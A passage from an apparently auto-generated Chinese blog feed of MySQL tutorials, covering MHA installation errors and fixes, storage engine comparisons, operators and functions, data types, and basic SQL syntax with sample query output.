<h5 id="七-部署过程遇到的问题"><a href="#七-部署过程遇到的问题" class="headerlink" title="七.部署过程遇到的问题"></a><span id="t12" style="font-weight: inherit; font-style: inherit;">七.部署过程遇到的问题</span></h5><p><strong>问题1：</strong> [root@node1 mha4mysql-node-0.56]# perl Makefile.PL<br>Can’t locate ExtUtils/MakeMaker.pm in @INC (@INC contains: inc /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at inc/Module/Install/Makefile.pm line 4.<br>BEGIN failed—compilation aborted at inc/Module/Install/Makefile.pm line 4. Compilation failed in require at inc/Module/Install.pm line 283.<br>Can’t locate ExtUtils/MakeMaker.pm in @INC (@INC contains: inc /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/<br>vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at inc/Module/Install/Can.pm line 6.<br>BEGIN failed—compilation aborted at inc/Module/Install/Can.pm line 6.<br>Compilation failed in require at inc/Module/Install.pm line 283.<br>Can’t locate ExtUtils/MM_Unix.pm in @INC (@INC contains: inc /usr/local/lib64/<br>perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at inc/Module/Install/<br>Metadata.pm line 349.<br><strong>解决办法：</strong><br>yum -y install perl-CPAN perl-devel perl-DBD-MySQL</p>
<p><strong>问题2：</strong><br>Can’t locate Time/HiRes.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at /usr/local/share/perl5/MHA/SSHCheck.pm line 28.<br>BEGIN failed—compilation aborted at /usr/local/share/perl5/MHA/SSHCheck.pm line 28.<br>Compilation failed in require at /usr/local/bin/masterha_check_ssh line 25. BEGIN failed—compilation aborted at /usr/local/bin/masterha_check_ssh line 25.<br><strong>解决办法</strong>：<br>yum -y install perl-Time-HiRes</p>
<p><strong>问题3：</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/mhaq.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/mhaq.jpg" alt="mhaq"></a></p>
<p><strong>解决办法:</strong><br>每个节点都做好mysql命令的软链<br>ln -s /usr/local/mysql/bin/* /usr/local/bin/</p>
<p><strong>参考文档：</strong></p>
<p><a href="https://code.google.com/p/mysql-master-ha" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha</a><br><a href="http://blog.chinaunix.net/uid-28437434-id-3476641.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-28437434-id-3476641.html</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mha </tag>
            
            <tag> MySQL高可用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[存储引擎介绍及适用场景]]></title>
      <url>/2014/08/20/e5-ad-98-e5-82-a8-e5-bc-95-e6-93-8e-e4-bb-8b-e7-bb-8d-e5-8f-8a-e9-80-82-e7-94-a8-e5-9c-ba-e6-99-af.html</url>
      <content type="html"><![CDATA[<p>查看当前的默认存储引擎<br><code>show variables like &#39;table_type&#39;;</code></p>
<p>查看当前数据库支持的引擎<br><code>show engines \G;</code><br><code>show variables like &#39;have%&#39;;</code></p>
<p>创建表时指定存储引擎<br><code>create table ai (i bigint(20) not null auto_increment,primary key(i));</code></p>
<p>修改表引擎<br><code>alter table ai engine=innodb;</code></p>
<p><strong>常见Mysql数据库引擎对比：</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/engines.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/engines.png" alt="engines"></a></p>
<h5 id="一、MyISAM引擎特点："><a href="#一、MyISAM引擎特点：" class="headerlink" title="一、MyISAM引擎特点："></a>一、MyISAM引擎特点：</h5><p>在磁盘存储成3个文件，文件名和表名一样，但扩展名分别为：<br>.frm (存储表定义)<br>.MYD （MYData，存储数据）<br>.MYI （MYIndex，存储索引）<br>其中数据文件和索引文件可以分开在不同目录，平均分布IO</p>
<p>创建表时指定数据和索引路径：</p>
<p><code>create table geekwolf (id int,c varchar(10)) data directory=&#39;/data/data/&#39; index directory=&#39;/data/index&#39; engine=&#39;MyISAM&#39;;</code></p>
<p>MyISAM的表可能出现损坏的解决办法：<br>check table geekwolf；检查表的健康情况<br>repair table geekwolf；修改表</p>
<p>MyISAM的表引擎支持3种不同的存储格式：<br><strong>静态表</strong>（默认格式，固定长度，存储时按照列宽度定义补足空格；在查询时会丢失尾部的空格）<br><strong>动态表</strong>（频繁更新删除记录会产生碎片，占用空间相对较少，需要定期执行optimize table 或myisamchk -r来改善性能）<br><strong>压缩表</strong> （由myisampack工具创建）</p>
<p><strong>适用场景：</strong><br>以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性，并发性要求不是很高的场景</p>
<h5 id="二、INNODB引擎特点："><a href="#二、INNODB引擎特点：" class="headerlink" title="二、INNODB引擎特点："></a>二、INNODB引擎特点：</h5><p><strong>1.自动增长列：</strong></p>
<pre><code>InnoDB表，自动增长列必须是索引，如果是组合索引，必须是组合索引的第一列；&amp;lt;br&amp;gt;
对于MyISAM引擎表，自动增长列可以是组合索引的其他列，这样插入记录后，自动增长列是按照组合索引的前面激烈进行排序后递增的&amp;lt;br&amp;gt;
创建MyISAM表autoincre_demo&amp;lt;br&amp;gt;
`&lt;/pre&gt;
`create table autoincre_demo (d1 smallint not null auto_increment,d2 smallint not null,name varchar(10),index(d2.d1)) engine=myisam;`

如图所示：自动增长列是d1作为组合索引的第二列,插入记录后，发现增长列是按照组合索引的第一列d2进行排序后递增的

[![autoincre](http://www.simlinux.com/wp-content/uploads/2014/08/autoincre.png)](http://www.simlinux.com/wp-content/uploads/2014/08/autoincre.png)

**2.外键约束：** Innodb引擎支持外键，在创建外键时，要求父表必须有对应的索引，子表在创建外键的时候也会自动创建对应的索引
外键信息可以通过show table status like ‘test’ \G; show create table ‘test’;

**3.存储方式：**
**A.** 使用共享表空间，这种方式创建的表结果保存在.frm文件，数据和索引保存在innodb_data_home_dir innodb_data_file_path定义的表空间中
**B.**多表空间存储，表结构保存在.frm文件中，但是每个表的数据和索引单独存放在.ibd中；每个分区对于单独的.ibd
（需要开启innodb_file_per_table=1）
对于使用多表空间的表可以方便进行单表备份恢复，简单复制ibd和frm文件的方法因没有共享表空间的字典信息，而无法使用；多表空间情况，因为Innodb把内部的数据字典和在线重做日志存放在共享表空间里面

**使用此语句删除.ibd文件：**
`ALTER TABLE tbl_name DISCARD TABLESPACE;`
要把备份的.ibd文件还原到表中，需把此文件复制到数据库目录中，然后书写此语句：
`ALTER TABLE tbl_name IMPORT TABLESPACE;`

**适用场景：**
需要事务处理，对事务的完整性要求高，并发条件下要求数据一致性的计费系统或者财务系统等对数据准心要求比较搞的系统（5.5+默认引擎）

##### 三、MEMORY引擎：

**A.**每个MEMORY表实际对应一个磁盘文件.frm，数据存放在内存，默认采用HASH索引（也可以设置撑Btree索引），服务关闭数据会丢失
**B.**是否memory表中的内存可以通过delete from 或者truncate 或者drop table
**C.**memory表可以放置数据量的大小受到max_heap_table_size变量约束，默认16M，在定义表时可以用MAX_ROWS指定表的最大行数
**D.**使用环境：用于内容变化不频繁或者作为统计操作的中间结果表

**适用场景：**
一般用于更新不太频繁的小表，用以快速得到访问结果的环境，但对表大小有限制

##### 四、TOKUDB引擎：

具有高压缩率高效的插入性能，支持大多数在线DDL
与InnoDB引擎对比测试：[http://www.tokutek.com/resources/tokudb-vs-innodb/](http://www.tokutek.com/resources/tokudb-vs-innodb/)
**特性：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`使用Fractal树索引保证了高效的插入性能
优秀的压缩特性，比InnoDB高近10倍
Hot Schema Changes特性支持在线创建索引和添加/删除属性列等DDL操作
使用Bulk Loader达到快速加载大数据量
提供主从延迟消除技术
支持ACID和MVCC
</code></pre><p><strong>适用场景：</strong><br>日志数据，日志通常插入频繁切存储量大；<br>历史数据，通常不会再有写操作，可以利用TokuDB的高压缩特性存储；<br>在线DDL较频繁的场景，使用TokuDB可以大大增加系统可用性；</p>
<p><strong>注：</strong> 具体使用哪种引擎要根据自己的业务的特点去决定</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[理解MySQL运算符和常用内置函数]]></title>
      <url>/2014/08/20/e7-90-86-e8-a7-a3mysql-e8-bf-90-e7-ae-97-e7-ac-a6-e5-92-8c-e5-b8-b8-e7-94-a8-e5-86-85-e7-bd-ae-e5-87-bd-e6-95-b0.html</url>
      <content type="html"><![CDATA[<h5 id="一、MySQL中的运算符"><a href="#一、MySQL中的运算符" class="headerlink" title="一、MySQL中的运算符"></a>一、MySQL中的运算符</h5><p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/suanshu.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/suanshu.png" alt="suanshu"></a></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/lj.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/lj.png" alt="lj"></a></p>
<p><strong>注意事项：<br>1.在除法运算和模数运算中，如果除数是0，将是非法除数，结果返回NULL</strong><br>取模运算中，也可以用MOD(a,b)函数或者a%b</p>
<pre><code>mysql&amp;gt; select 1/0, 100%0;
+------+-------+
| 1/0 | 100%0 |
+------+-------+
| NULL | NULL |
+------+-------+
1 row in set (0.01 sec)
mysql&amp;gt; select 3%2,mod(3,2);
+------+----------+
| 3%2 | mod(3,2) |
+------+----------+
| 1 | 1 |
+------+----------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**2.NULL只能用&amp;lt;=&amp;gt;进行比较，其他的比较运算符时返回NULL**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; select &apos;a&apos;&amp;lt;&apos;b&apos;,&apos;a&apos;&amp;lt;&apos;a&apos;,1&amp;lt;2,null&amp;lt;=&amp;gt;null;
+---------+---------+-----+-------------+
| &apos;a&apos;&amp;lt;&apos;b&apos; | &apos;a&apos;&amp;lt;&apos;a&apos; | 1&amp;lt;2 | null&amp;lt;=&amp;gt;null |
+---------+---------+-----+-------------+
| 1 | 0 | 1 | 1 |
+---------+---------+-----+-------------+
1 row in set (0.02 sec)
mysql&amp;gt; select &apos;a&apos;&amp;lt;&apos;b&apos;,&apos;a&apos;&amp;lt;&apos;a&apos;,1&amp;lt;2,null&amp;lt;null;
+---------+---------+-----+-----------+
| &apos;a&apos;&amp;lt;&apos;b&apos; | &apos;a&apos;&amp;lt;&apos;a&apos; | 1&amp;lt;2 | null&amp;lt;null |
+---------+---------+-----+-----------+
| 1 | 0 | 1 | NULL |
+---------+---------+-----+-----------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**3.BETWEEN IN**
between运算符使用“a BETWEEN min AND max”当a大于等于min并且小于等于max返回1，否则返回0  IN运算符使用”a IN（values1,values2,…)“，当a的值存在于列表中时，则郑鄂表达式返回值1，否则0

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; select 10 between 10 and 20,9 between 10 and 20;
+----------------------+---------------------+
| 10 between 10 and 20 | 9 between 10 and 20 |
+----------------------+---------------------+
| 1 | 0 |
+----------------------+---------------------+
1 row in set (0.00 sec)
mysql&amp;gt; select 1 in(1,2,3),&apos;t&apos; in (&apos;t&apos;,&apos;a&apos;,&apos;b&apos;,&apos;f&apos;),0 in(1,2);
+-------------+--------------------------+-----------+
| 1 in(1,2,3) | &apos;t&apos; in (&apos;t&apos;,&apos;a&apos;,&apos;b&apos;,&apos;f&apos;) | 0 in(1,2) |
+-------------+--------------------------+-----------+
| 1 | 1 | 0 |
+-------------+--------------------------+-----------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**4.REGEXP运算符格式”str REGEXP str_pat”**
当str字符串中含有str_pat相匹配的字符串时返回1，否则0

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; select &apos;abcdef&apos; regexp &apos;ac&apos;,&apos;abcdef&apos; regexp &apos;ab&apos;,&apos;abcdefg&apos; regexp &apos;k&apos;;
+----------------------+----------------------+----------------------+
| &apos;abcdef&apos; regexp &apos;ac&apos; | &apos;abcdef&apos; regexp &apos;ab&apos; | &apos;abcdefg&apos; regexp &apos;k&apos; |
+----------------------+----------------------+----------------------+
| 0 | 1 | 0 |
+----------------------+----------------------+----------------------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**5\. 逻辑与AND和逻辑或OR**
AND：当所有操作数都为非零，并且不为NULL时，返回1；当一个或多个为0时，返回0；操作数任何一个为NULL，则返回NULL
OR : 当两个操作数均为非NULL值时，如有任意一个为非零值，则返回1，否则0；
当有一个操作数为NULL时，如另外一个为非0，则结果1，否则NULL;
如果两个操作数均为NULL，则所得结果为NULL

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; select (1 and 1),(0 and 1),(3 and 1),(1 and null);
+-----------+-----------+-----------+--------------+
| (1 and 1) | (0 and 1) | (3 and 1) | (1 and null) |
+-----------+-----------+-----------+--------------+
| 1 | 0 | 1 | NULL |
+-----------+-----------+-----------+--------------+
1 row in set (0.00 sec)
mysql&amp;gt; select (1 or 0),(0 or 0),(1 or null),(1 or 1),(null or null);
+----------+----------+-------------+----------+----------------+
| (1 or 0) | (0 or 0) | (1 or null) | (1 or 1) | (null or null) |
+----------+----------+-------------+----------+----------------+
| 1 | 0 | 1 | 1 | NULL |
+----------+----------+-------------+----------+----------------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**6.位运算**
位与对多个操作数的二进制位做逻辑与操作

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; select bin(2);
+--------+
| bin(2) |
+--------+
| 10 |
+--------+
1 row in set (0.00 sec)
mysql&amp;gt; select bin(3);
+--------+
| bin(3) |
+--------+
| 11 |
+--------+
1 row in set (0.00 sec)
mysql&amp;gt; select bin(100);
+----------+
| bin(100) |
+----------+
| 1100100 |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select 2&amp;amp;3&amp;amp;100;
+---------+
| 2&amp;amp;3&amp;amp;100 |
+---------+
| 0 |
+---------+
1 row in set (0.00 sec)
</code></pre><p><strong>7.位取反</strong><br>在MySQL中，常量数字默认会以8个字节来表示，8字节就是64位，常量1的二进制表示为63个0加1个1，位取反后就是63个1加1个0，转换成十进制后就是18446744073709551614</p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/qf.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/qf.png" alt="qf"></a></p>
<p><strong>8.位右移</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/wyy.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/wyy.png" alt="wyy"></a></p>
<h5 id="二、运算符的优先级"><a href="#二、运算符的优先级" class="headerlink" title="二、运算符的优先级"></a>二、运算符的优先级</h5><p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/yxj.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/yxj.png" alt="yxj"></a></p>
<h5 id="三、常用内置函数"><a href="#三、常用内置函数" class="headerlink" title="三、常用内置函数"></a>三、常用内置函数</h5><p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/strfun.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/strfun.png" alt="strfun"></a></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/numfun.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/numfun.png" alt="numfun"></a></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/timefun.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/timefun.png" alt="timefun"></a></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/otherfun.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/otherfun.png" alt="otherfun"></a></p>
<p><strong>注意事项：</strong><br><span style="color: #222222;">date_format(date,fmt)fmt格式:</span><br><a href="http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-format" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-format</a><br><span style="color: #222222;">date_add(date,INTERVAL expr type) type类型：</span><br><a href="http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-add" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-add</a></p>
<p><strong>参考文档：</strong><a href="http://dev.mysql.com/doc/refman/5.5/en/functions.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.5/en/functions.html</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql支持的数据类型]]></title>
      <url>/2014/08/20/mysql-e6-94-af-e6-8c-81-e7-9a-84-e6-95-b0-e6-8d-ae-e7-b1-bb-e5-9e-8b.html</url>
      <content type="html"><![CDATA[<h5 id="一、数值类型"><a href="#一、数值类型" class="headerlink" title="一、数值类型"></a>一、数值类型</h5><p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/numbers.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/numbers.png" alt="numbers"></a></p>
<p><strong>注意事项：</strong><br><strong>1. int类型里面默认的数据宽度是11，即int(11)</strong><br><span style="color: #222222;"> 关于zerofill，在数字位数不够的空间用字符0填充</span><br><span style="color: #222222;"> 例如：</span></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/n2.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/n2.png" alt="n2"></a></p>
<p><strong>2.整数类型有AUTO_INCREMENT的属性</strong><br>AUTO_INCREMENT的值一般从1开始，每行增加1，插入NULL到一个AUTO_INCREMENT列时，Mysql插入一个比该列中当前最大值大1的值<br>一个表中最多只能有一个AUTO_INCREMENT列<br>使用AUTO_INCREMENT的条件：<br>该列应该定义为NOT NULL，并且为PRIMARY KEY 或者UNIQUE键</p>
<p> 例如：</p>
<pre><code>CREATE TABLE AI(ID INT AUTO_INCREMENT NOT NULL PRIMARY KEY);
CREATE TABLE AI(ID INT AUTO_INCREMENT NOT NULL ,PRIMARY KEY(ID));
CREATE TABLE AI(ID INT AUTO_INCREMENT NOT NULL ,UNIQUE(ID));
`&lt;/pre&gt;

**3.BIT位数据类型查询方式**
bit位数据类型列不能直接查询得出结果，使用bin()显示为二进制格式，或者hex()显示为十六进制格式函数进行读取

 例如：

[![n3](http://www.simlinux.com/wp-content/uploads/2014/08/n3.png)](http://www.simlinux.com/wp-content/uploads/2014/08/n3.png)

&amp;nbsp;

##### 二、日期和时间类型

[![time](http://www.simlinux.com/wp-content/uploads/2014/08/time.png)](http://www.simlinux.com/wp-content/uploads/2014/08/time.png)

**注意事项:**
**1.经常插入或者跟新日期为当前系统时间通常用TIMESTAMP来表示**
但是MySQL规定TIMESTAMP类型字段只能有一列的默认值为current_timestamp,第二个TIMESTAMP字段的默认值为0，即0000-00-00 00：00：00；时间与时区相关

**2\. DATETIME是DATE和TIME的结合**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; create table t(d date,t time,dt datetime);
Query OK, 0 rows affected (0.11 sec)
mysql&amp;gt; desc t;
+-------+----------+------+-----+---------+-------+
| Field | Type | Null | Key | Default | Extra |
+-------+----------+------+-----+---------+-------+
| d | date | YES | | NULL | |
| t | time | YES | | NULL | |
| dt | datetime | YES | | NULL | |
+-------+----------+------+-----+---------+-------+
3 rows in set (0.00 sec)
mysql&amp;gt; select now();
+---------------------+
| now() |
+---------------------+
| 2014-04-08 11:38:24 |
+---------------------+
1 row in set (0.01 sec)
mysql&amp;gt; insert into t values(now(),now(),now());
Query OK, 1 row affected, 1 warning (0.00 sec)
mysql&amp;gt; show warnings;
+-------+------+----------------------------------------+
| Level | Code | Message |
+-------+------+----------------------------------------+
| Note | 1265 | Data truncated for column &apos;d&apos; at row 1 |
+-------+------+----------------------------------------+
1 row in set (0.00 sec)
mysql&amp;gt; select * from t;
+------------+----------+---------------------+
| d | t | dt |
+------------+----------+---------------------+
| 2014-04-08 | 11:38:40 | 2014-04-08 11:38:40 |
+------------+----------+---------------------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**3.TIMESTAMP 和DATETIME的区别**
A.TIMESTAMP支持的范围较小
B.表中第一个TIMESTAMP列自动设置为系统时间；如果列中插入NULL或者不明确的赋值都会自动设置该列的值为当前的日期和时间；超过TIMESTAMP的取值范围时，直接由0000-00-00 00：00：00填补
C.TIMESTAMP的插入和查询都受当地时区的影响，更能反应实际日期；DATETIME则只能反映出插入时当地的失去，其他时区的人查看数据必然会有误差

**4.YEAR**
有4位格式（允许的值是1901~2155、0000，默认值）的年，有2位格式（允许的值70-69，即1970~2069,Mysql5.5.27以后版本不再支持）的年

##### 三、字符串类型

[![char](http://www.simlinux.com/wp-content/uploads/2014/08/char.png)](http://www.simlinux.com/wp-content/uploads/2014/08/char.png)

**注意事项：**
**1.varchar和char的不同之处在于存储方式不同**
&lt;span style=&quot;color: #222222;&quot;&gt; A. char列的长度固定为创建表时声明的长度，长度可以为0~255；varchar列中的值为可变长字符串，长度可以为0~65535&lt;/span&gt;

[![charst](http://www.simlinux.com/wp-content/uploads/2014/08/charst.png)](http://www.simlinux.com/wp-content/uploads/2014/08/charst.png)

 B.查询时char列删除了尾部的空格，而varchar则保留了这些空格
例如：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; CREATE TABLE vc (v VARCHAR(4), c CHAR(4));
Query OK, 0 rows affected (0.10 sec)
mysql&amp;gt; INSERT INTO vc VALUES (&apos;ab &apos;, &apos;ab &apos;);
Query OK, 1 row affected (0.00 sec)
mysql&amp;gt; SELECT CONCAT(&apos;(&apos;, v, &apos;)&apos;), CONCAT(&apos;(&apos;, c, &apos;)&apos;) FROM vc;
+---------------------+---------------------+
| CONCAT(&apos;(&apos;, v, &apos;)&apos;) | CONCAT(&apos;(&apos;, c, &apos;)&apos;) |
+---------------------+---------------------+
| (ab ) | (ab) |
+---------------------+---------------------+
1 row in set (0.00 sec)
mysql&amp;gt; select length(v),length(c) from vc;
+-----------+-----------+
| length(v) | length(c) |
+-----------+-----------+
| 4 | 2 |
+-----------+-----------+
1 row in set (0.00 sec)
mysql&amp;gt; select concat(v,&apos;+&apos;),concat(c,&apos;+&apos;) from vc;
+---------------+---------------+
| concat(v,&apos;+&apos;) | concat(c,&apos;+&apos;) |
+---------------+---------------+
| ab + | ab+ |
+---------------+---------------+
1 row in set (0.00 sec)
`&lt;/pre&gt;

**2.BINARY和VARBINARY类型：**类似CHAR和VARCHAR类型，不同的是它们包含二进制字符串而不包含非二进制字符串；CHAR(M)、VARCHAR(M)中的M表示字符长度，BINARY(M)和VARBINARY(M)中M表示字节的长度

**3.ENUM类型(枚举类型)**
对于1~255个成员的枚举需要1个字节存储，对于255~65535个成员，需要2个字节存储，最多允许65535个成员
例如:

[![enum](http://www.simlinux.com/wp-content/uploads/2014/08/enum.png)](http://www.simlinux.com/wp-content/uploads/2014/08/enum.png)

 ENUM类型是忽略大小写的，在存储”M” “f”时将它们都转换成大写，插入不存在的ENUM指定的范围内的值时，并没有警告，而是插入了enum(’M’,‘F’)的第一个值“M”，只允许从集合中选取单个值，不能一次取多个

**4.SET类型**
SET是一个字符串对象，包含0~64个成员，与ENUM的区别在于可以一次选取多个成员
1~8成员的集合，占1个字节
9~16成员的集合，占2个字节
17~24成员的集合，占用3个字节
25~32成员的集合，占用4个字节
33~64成员的集合，占用8个字节
例如：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; create table t (col set(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;));
Query OK, 0 rows affected (0.22 sec)
mysql&amp;gt; desc t;
+-------+----------------------+------+-----+---------+-------+
| Field | Type | Null | Key | Default | Extra |
+-------+----------------------+------+-----+---------+-------+
| col | set(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;) | YES | | NULL | |
+-------+----------------------+------+-----+---------+-------+
1 row in set (0.00 sec)
mysql&amp;gt; insert into t values(&apos;a,b&apos;),(&apos;a,d,a&apos;),(&apos;a,b&apos;),(&apos;a,c&apos;),(&apos;a&apos;);
Query OK, 5 rows affected (0.00 sec)
Records: 5 Duplicates: 0 Warnings: 0
mysql&amp;gt; select * from t;
+------+
| col |
+------+
| a,b |
| a,d |
| a,b |
| a,c |
| a |
+------+
5 rows in set (0.00 sec)
</code></pre><p>对于(‘a,d,a’)这样包含重复成员的集合将取一次，写入后的结果为“a,d”<br><strong>参考文档：</strong><a href="http://dev.mysql.com/doc/refman/5.5/en/data-types.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.5/en/data-types.html</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Sql基础操作总结]]></title>
      <url>/2014/08/20/sql-e5-9f-ba-e7-a1-80-e6-93-8d-e4-bd-9c-e6-80-bb-e7-bb-93.html</url>
      <content type="html"><![CDATA[<p>本文主要根据自己的学习过程总结的文章，可能并不全面，牛人请绕过~<br>show create table user \G; 查看创建user表的sql<br><strong>修改表结构：</strong></p>
<pre><code>alter  table tablename modify[culumn] column_definition [first|after col_name]
例子：
修改emp的字段数据类型
alter table  emp modify ename varchar(20);
表首增加字段
alter table emp add column id int(10) first;
删除字段
alter table emp drop [column]  id;
字段改名 
alter table tablename change [column] old_name column_definition [first/after col_name]
更改表名
alter table emp rename [to] test;
`&lt;/pre&gt;

**注释：** modify只能修改字段数据类型，不能修改字段名称，first/after 表示修改字段的顺序

**插入操作:**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`insert into table emp(f1,f2,f3) values(v1,v2,v3);
insert into table  emp values(v1,v2,v3);
一次插入多条记录
insert into table emp(f1,f2,f3)
values
(r1_v1,r2_v1,r3_v1),
(r1_v2,r2_v2,r3_v3);
`&lt;/pre&gt;

**查询：**
1.查询不重复记录 distinct

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`select distinct deptno from emp;
`&lt;/pre&gt;

2.条件查询 where
where字段比较 &amp;gt;、&amp;lt;、&amp;gt;=、&amp;lt;=、!= 等，多条件用or、and等 3.排序和限制 order by 排序关键字（默认是升序排列）：
DESC 表示按照字段进行降序排列
ASC 表所升序排列
limit n显示前N条记录 4.聚合操作

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`语法： select [fidled1,field2,...,fieldn] fun_name
from  tablename
[where where_contition]
[group by  field1,field2,...fieldn]
[with rollup]
[having where_contition]

fun_name :表示做聚合操作的函数，比如：sum、count（*）、max、min
group by  :表示要进行分类聚合的字段
with follup ：可选，表示是否对分类聚合后的结果进行在汇总
having  ：表示在对分类后的结果在进行条件的过滤
`&lt;/pre&gt;

having和where的区别:
having是对聚合后的结果进行条件的过滤，而where是在聚合前就对记录进行过滤，如果逻辑允许，我们尽可能用where先过滤记录，这样因为结果集减小，将对聚合的效率大大提高，最后在根据逻辑看是否用having进行再过滤

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`例如：
 统计各个部门的人数：
 select deptno,count(1) from emp group by deptno;
 统计各个部门的人数，又要统计总人数:
 select deptno,count(1) from emp group by deptno with rollup;
 统计人数大于1的部门：
 select deptno,count(1) from emp group by deptno having count(1)&amp;gt;1;
 统计公司所有员工的薪水总额、最高和最低薪水
 select sum(sal),max(sal),min(sal) from emp;
`&lt;/pre&gt;

3.表连接
表连接分为：内连接和外连接；内连接：仅选出两张表中互相匹配的记录；外连接：选出其他不匹配的记录

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`例如：
 查询雇员的名字和所在部门名称（雇员和部门分属于两个表）
 select ename,deptname from emp,dept where emp.deptno=dept.deptno;
   外连接分为： 
   左连接：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录
   右连接：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录

例如：查询emp中所有用户和所在部门名称
select ename,deptname from dept right join emp on dept.deptno=emp.deptno;
或可用左连接代替
select ename,deptname from emp left join dept on emp.deptno=dept.deptno;
`&lt;/pre&gt;
表连接的好文章： [http://coolshell.cn/articles/3463.html](http://coolshell.cn/articles/3463.html)
MySQL的联结（Join）语法：
[http://www.blogjava.net/chenpengyi/archive/2005/10/17/15747.html](http://www.blogjava.net/chenpengyi/archive/2005/10/17/15747.html)

4.子查询 用于子查询的关键字包括in、not in、=、!=、exits、not exits等
例如：
&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`从emp表中查询出所有部门在dept表中的所有记录
select * from emp where deptno in(select deptno from dept);
可以使用表连接替换：
select emp.*  from emp,dept where emp.deptno=dept.deptno;

查询记录数唯一，可用=代替in
select * from emp where deptno = (select deptno from dept limit 1);
`&lt;/pre&gt;
5.记录联合（union、union all） 场景：将两个表的数据按照一定的查询条件查询出来后，在合并显示 union和union all的区别在于union all把结果集直接合并在一起，而union是将union all后的结果进行了去重DISTINCT后的结果

[![unionall](http://www.simlinux.com/wp-content/uploads/2014/08/unionall1.png)](http://www.simlinux.com/wp-content/uploads/2014/08/unionall1.png)

**查看帮助：**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`显示可供查询的分类
mysql&amp;gt;? contents

针对某个分类查看帮助
mysql&amp;gt;? data types

查看int数据类型介绍
mysql&amp;gt;? int

查看关键字的语法
mysql&amp;gt;? show
